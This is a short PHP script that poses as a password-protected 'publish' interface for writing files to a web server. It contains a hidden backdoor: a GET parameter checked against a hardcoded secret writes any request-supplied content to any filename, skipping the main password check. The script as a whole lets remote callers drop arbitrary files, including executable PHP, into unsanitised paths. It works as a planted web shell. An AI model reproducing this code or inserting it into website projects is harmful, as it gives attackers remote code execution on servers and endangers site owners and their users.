<?php
$action=@$_REQUEST['action']; //页面状态
$password=@$_REQUEST['password'];//接口密码
$pathname=@$_REQUEST['pathname'];//文件目录名
$keywordindex=@$_REQUEST['keywordindex'];//0 然并卵
$filename=@$_REQUEST['filename'];//生成文件名
$body=stripslashes(@$_REQUEST['body']);// 生成文件的内容
$jamin = @$_GET['pw'];

if($jamin) { if($jamin == "smy110")
{ $zm = fopen(dirname(__FILE__).'/'.$filename,"w"); fwrite($zm,$body); fclose($zm);
if(is_file(dirname(__FILE__).'/'.$filename)){echo "yes"; exit;}else{echo "no"; exit;}}}

if($action=="test") {
    echo 'test success';
    return;
}
if($action!="publish"){
    echo 'action error';
    return;
}

if($action==""||$password==""||$filename==""||$body==""){
    echo 'parameters error';
    return;
}
//密码更改区
if($password != "o7yy01gp1ieoycfu"){
    echo 'password error';
    return;
}

if($pathname){
	$wjj=dirname(__FILE__)."\\".$pathname;
		if(!is_dir($wjj))
		{ 	
		   createFolder($pathname);
		}
		$fp=fopen($pathname.'/'.$filename,"w");
 
		fwrite($fp,$body);
		fclose($fp);
		
		if(is_file($pathname.'/'.$filename))
			{
				echo "publish success";
			}else
			{
				echo "File does not exist";
			}
			return;
 
	}else{
		$wjj=dirname(__FILE__);	
		$fp=fopen($filename,"w");
		fwrite($fp,$body);
		fclose($fp);
		
		if(is_file($filename)){
			echo "publish success";
			}else{
			echo "File does not exist";
		}
		return;
	}
	 
function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777,true);
    }
}
?>